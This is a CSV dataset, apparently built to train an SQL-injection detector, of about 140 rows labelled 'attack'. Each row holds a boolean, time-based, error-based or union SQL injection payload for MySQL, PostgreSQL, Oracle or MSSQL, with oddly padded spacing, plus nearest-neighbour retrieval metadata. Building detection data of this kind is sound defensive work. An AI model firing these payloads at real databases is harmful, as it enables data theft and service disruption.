id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001021,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007450,0.1752937328144639
SMOTE_001022,attack,boolean,"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R004730,0.019460813380401842
SMOTE_001023,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R005417,0.4880760117591781
SMOTE_001024,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R008857,0.6756829389545196
SMOTE_001025,attack,boolean,"1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R006503,0.2619744593199571
SMOTE_001026,attack,boolean,1'||  (  select 'fven' where 1433  =  1433 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',nearest_attack_euclidean,R006504,0.3108167270356322
SMOTE_001027,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R003384,0.6743272427482054
SMOTE_001028,attack,other,1'+  (  select kfmv where 1679  =  1679,nearest_attack_euclidean,R002093,0.0067600692432088156
SMOTE_001029,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R004894,0.0032147861111503835
SMOTE_001030,attack,error,-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,nearest_attack_euclidean,R007562,0.20206867917917434
SMOTE_001031,attack,other,"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",nearest_attack_euclidean,R003106,0.2008355315475994
SMOTE_001032,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R001714,0.12111484551707587
SMOTE_001033,attack,error,"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R001745,0.016193049770879535
SMOTE_001034,attack,boolean,"-8319""   )    )    or 7878  =  5970 and    (    (   ""jcaz"" like ""jcaz",nearest_attack_euclidean,R002396,0.26826421962442815
SMOTE_001035,attack,boolean,"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006355,0.05614308557970841
SMOTE_001036,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",nearest_attack_euclidean,R008467,0.06988154318881776
SMOTE_001037,attack,boolean,"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R004057,0.08024913674346992
SMOTE_001038,attack,boolean,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R004982,0.06131233691157761
SMOTE_001039,attack,boolean,"-9881""   )    )    or 9850  =  8118#",nearest_attack_euclidean,R000901,0.01635554753783637
SMOTE_001040,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R001755,0.3003085294267258
SMOTE_001041,attack,other,1'+  (  select 'vnue' where 5807  =  5807,nearest_attack_euclidean,R002492,0.006016384912282686
SMOTE_001042,attack,error,-7710' where 5658  =  5658 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R008960,0.8789844618052165
SMOTE_001043,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R002208,0.43560307898037287
SMOTE_001044,attack,boolean,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',nearest_attack_euclidean,R000018,1.580551972649362
SMOTE_001045,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ygfv'  =  'ygfv",nearest_attack_euclidean,R002351,0.028523166394573397
SMOTE_001046,attack,other,1' where 1623  =  1623,nearest_attack_euclidean,R001570,0.0
SMOTE_001047,attack,other,-3497' order by 1#,nearest_attack_euclidean,R001474,0.0
SMOTE_001048,attack,time,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",nearest_attack_euclidean,R003268,0.11680154936473287
SMOTE_001049,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R004606,0.27156413114905886
SMOTE_001050,attack,union,"-9774'   )    )     )   union all select 6954,6954,6954#",nearest_attack_euclidean,R003515,0.10850270025037287
SMOTE_001051,attack,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R005004,0.06537830655501367
SMOTE_001052,attack,boolean,"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R007616,0.15603737349150906
SMOTE_001053,attack,time,select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,nearest_attack_euclidean,R006267,0.05553623232586838
SMOTE_001054,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh",nearest_attack_euclidean,R007738,0.5273655926822711
SMOTE_001055,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R006582,0.36952059856363373
SMOTE_001056,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R004242,0.08045339539692939
SMOTE_001057,attack,union,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",nearest_attack_euclidean,R003404,0.34845847152534304
SMOTE_001058,attack,boolean,"-4945 or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R004949,1.2450345447021394
SMOTE_001059,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R008647,0.47390342890184944
SMOTE_001060,attack,boolean,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets",nearest_attack_euclidean,R008739,0.09546508155513045
SMOTE_001061,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000076,0.0887763884949272
SMOTE_001062,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R007955,0.09236662495904345
SMOTE_001063,attack,error,"1%"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,nearest_attack_euclidean,R008882,0.17156303052024868
SMOTE_001064,attack,other,1' where 1623  =  1623,nearest_attack_euclidean,R001570,0.0
SMOTE_001065,attack,boolean,1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,nearest_attack_euclidean,R008005,0.6273186156655909
SMOTE_001066,attack,other,"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R005735,0.31241524877901916
SMOTE_001067,attack,boolean,"1""  )   as pydh where 3407  =  3407 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R002794,0.1719317257899168
SMOTE_001068,attack,boolean,"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""zzkc""  =  ""zzkc",nearest_attack_euclidean,R008939,0.26633542906733015
SMOTE_001069,attack,boolean,"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R008836,1.1974548195187062
SMOTE_001070,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007603,0.29822463508194574
SMOTE_001071,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R001536,0.2545638255527849
SMOTE_001072,attack,boolean,"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R004647,0.13365829439751872
SMOTE_001073,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R006498,1.0266785453308676
SMOTE_001074,attack,union,"-1413""  )   union all select 6651,6651,6651--",nearest_attack_euclidean,R008075,0.2857576237525245
SMOTE_001075,attack,error,-8095'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R003962,1.0386350429809301
SMOTE_001076,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000013,0.0
SMOTE_001077,attack,other,1'||  (  select 'ussi' where 8958  =  8958,nearest_attack_euclidean,R005137,0.007669493562840761
SMOTE_001078,attack,time,"1"" where 3329  =  3329 or sleep  (  5  )  --",nearest_attack_euclidean,R004044,0.03268725670268943
SMOTE_001079,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R002969,0.4047795423012613
SMOTE_001080,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'ialm'  =  'ialm,nearest_attack_euclidean,R008201,0.0777769252928745
SMOTE_001081,attack,union,"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",nearest_attack_euclidean,R001920,0.13358573616845423
SMOTE_001082,attack,other,1   )    )     )   order by 1#,nearest_attack_euclidean,R005897,0.015210230002994447
SMOTE_001083,attack,time,1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R002684,0.47402973893222833
SMOTE_001084,attack,boolean,"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006522,0.21316146826029114
SMOTE_001085,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000827,0.3977130412998975
SMOTE_001086,attack,union,"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",nearest_attack_euclidean,R005196,0.2695510781791808
SMOTE_001087,attack,union,"-4394'   )    )    union all select 3409,3409--",nearest_attack_euclidean,R002648,0.16197155751972134
SMOTE_001088,attack,time,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,nearest_attack_euclidean,R002732,0.33764781725222465
SMOTE_001089,attack,boolean,"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003809,0.6959952735665202
SMOTE_001090,attack,union,"1"" union all select null,null,null,null#",nearest_attack_euclidean,R002810,0.27602045549972376
SMOTE_001091,attack,other,"1""",nearest_attack_euclidean,R003704,1.6491332862425154
SMOTE_001092,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,0.0
SMOTE_001093,attack,boolean,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,nearest_attack_euclidean,R003060,0.20399950251411028
SMOTE_001094,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R003337,0.19133799364061815
SMOTE_001095,attack,boolean,"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R007335,0.04977755216049011
SMOTE_001096,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",nearest_attack_euclidean,R005919,0.09114951022738159
SMOTE_001097,attack,boolean,"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000821,0.10162744050730678
SMOTE_001098,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R005427,0.18875480519585305
SMOTE_001099,attack,union,"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",nearest_attack_euclidean,R005097,0.31047532137008593
SMOTE_001100,attack,union,"-9371'  )   union all select 5900,5900,5900#",nearest_attack_euclidean,R007944,0.027720053978221575
SMOTE_001101,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'knhm'  =  'knhm",nearest_attack_euclidean,R007975,0.16556758727086673
SMOTE_001102,attack,union,"1' where 6721  =  6721 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R004911,0.0489641983964972
SMOTE_001103,attack,boolean,1'||  (  select 'dsjg' where 2402  =  2402 and 1947  =  7472--,nearest_attack_euclidean,R007009,0.40767334226599844
SMOTE_001104,attack,other,select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004625,1.1920928955078125e-07
SMOTE_001105,attack,boolean,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'napi' like 'napi,nearest_attack_euclidean,R003030,0.22144620023085512
SMOTE_001106,attack,error,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",nearest_attack_euclidean,R003004,0.022999585729469557
SMOTE_001107,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R007494,0.0865560454105529
SMOTE_001108,attack,other,"1""  )   where 6311  =  6311",nearest_attack_euclidean,R001789,0.03263627070998141
SMOTE_001109,attack,error,"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",nearest_attack_euclidean,R002059,0.6171128348551459
SMOTE_001110,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'oskf' like 'oskf",nearest_attack_euclidean,R006251,0.4771190248685407
SMOTE_001111,attack,boolean,-2291   )    )    or 4067  =  5666#,nearest_attack_euclidean,R001325,0.3282375592862548
SMOTE_001112,attack,other,"1""  )   as lvbm where 8179  =  8179",nearest_attack_euclidean,R002903,8.429369702178807e-08
SMOTE_001113,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R004457,0.1488760429474008
SMOTE_001114,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000408,1.0993799993900195
SMOTE_001115,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",nearest_attack_euclidean,R005901,0.698291609508279
SMOTE_001116,attack,time,1 where 9393  =  9393 waitfor delay '0:0:5'--,nearest_attack_euclidean,R008593,0.1237078665631179
SMOTE_001117,attack,boolean,"1   )    )    as qfnu where 1609  =  1609 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R007234,0.1367338457397
SMOTE_001118,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  7975  =  2446  )   then 1 else 0x28 end   )    )    and    (    (     (  ""qixm"" like ""qixm",nearest_attack_euclidean,R003829,0.11788397689958294
SMOTE_001119,attack,boolean,"-2548""   )    )     )   or 5107  =  8049--",nearest_attack_euclidean,R000965,0.027145478310402458
SMOTE_001120,attack,other,1  )   where 5774  =  5774,nearest_attack_euclidean,R000908,0.0
SMOTE_001121,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000770,0.011214948011366757
SMOTE_001122,attack,other,if  (  7427  =  7800  )   select 7427 else drop function dgir--,nearest_attack_euclidean,R003744,0.0033280510845684875
SMOTE_001123,attack,error,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'dgwe' like 'dgwe",nearest_attack_euclidean,R008107,0.02243889266634895
SMOTE_001124,attack,time,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,nearest_attack_euclidean,R003815,0.2646255852863183
SMOTE_001125,attack,time,waitfor delay '0:0:5' and    (    (   '%'  =  ',nearest_attack_euclidean,R008683,0.40851337141019106
SMOTE_001126,attack,other,select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,nearest_attack_euclidean,R001333,0.00026713455928892933
SMOTE_001127,attack,error,-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R001398,0.030368397618882607
SMOTE_001128,attack,union,"-2325'   )    )     )   union all select 1442,1442,1442--",nearest_attack_euclidean,R007598,0.10841965672178769
SMOTE_001129,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R005131,0.024440965140086365
SMOTE_001130,attack,boolean,1  )   where 6725  =  6725 and 1553  =  7419,nearest_attack_euclidean,R002201,0.15156354617461676
SMOTE_001131,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000229,0.004067811276924364
SMOTE_001132,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R001245,0.08229464543293787
SMOTE_001133,attack,boolean,1 where 6494  =  6494 and 8463  =  2760,nearest_attack_euclidean,R008043,0.8955705260066682
SMOTE_001134,attack,boolean,"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",nearest_attack_euclidean,R003471,0.29793959943041776
SMOTE_001135,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""ctzh""  =  ""ctzh",nearest_attack_euclidean,R005496,0.13642426551947975
SMOTE_001136,attack,error,"1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R008832,0.047353767619925574
SMOTE_001137,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R007744,0.13808552241226216
SMOTE_001138,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000394,0.116895788997163
SMOTE_001139,attack,boolean,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",nearest_attack_euclidean,R006740,0.24861812968009325
SMOTE_001140,attack,boolean,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,nearest_attack_euclidean,R000218,0.09059815354089774
SMOTE_001141,attack,boolean,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,nearest_attack_euclidean,R003181,0.06535211232459266
SMOTE_001142,attack,boolean,1  )   where 5866  =  5866 and 4595  =  4595#,nearest_attack_euclidean,R007479,0.0937014269552992
SMOTE_001143,attack,error,"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",nearest_attack_euclidean,R004065,0.19190217077974064
SMOTE_001144,attack,boolean,"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",nearest_attack_euclidean,R005365,0.10250144561357043
SMOTE_001145,attack,boolean,"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""endx""  =  ""endx",nearest_attack_euclidean,R007721,0.4101499101044426
SMOTE_001146,attack,union,"1%'  )   union all select null,null--",nearest_attack_euclidean,R003721,0.29282121780653786
SMOTE_001147,attack,boolean,"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'xqkq'  =  'xqkq",nearest_attack_euclidean,R002440,0.005140276330554504
SMOTE_001148,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R006800,0.16166273888583826
SMOTE_001149,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R002611,0.041868494532107094
SMOTE_001150,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,nearest_attack_euclidean,R004077,0.284788912476537
SMOTE_001151,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000190,3.371747880871523e-07
SMOTE_001152,attack,union,"-2734'  )   union all select 5510,5510,5510,5510,5510#",nearest_attack_euclidean,R002346,0.07026273691274028
SMOTE_001153,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",nearest_attack_euclidean,R007329,0.15862251237712938
SMOTE_001154,attack,time,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",nearest_attack_euclidean,R004837,0.4032964165348405
SMOTE_001155,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R001120,0.3587585686114526
SMOTE_001156,attack,boolean,1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pnpx'  =  'pnpx,nearest_attack_euclidean,R001575,0.13527462766651152
SMOTE_001157,attack,boolean,"-7743"" or 9323  =  9323#",nearest_attack_euclidean,R008611,0.005030937804176065
SMOTE_001158,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R005348,0.05561768065288499
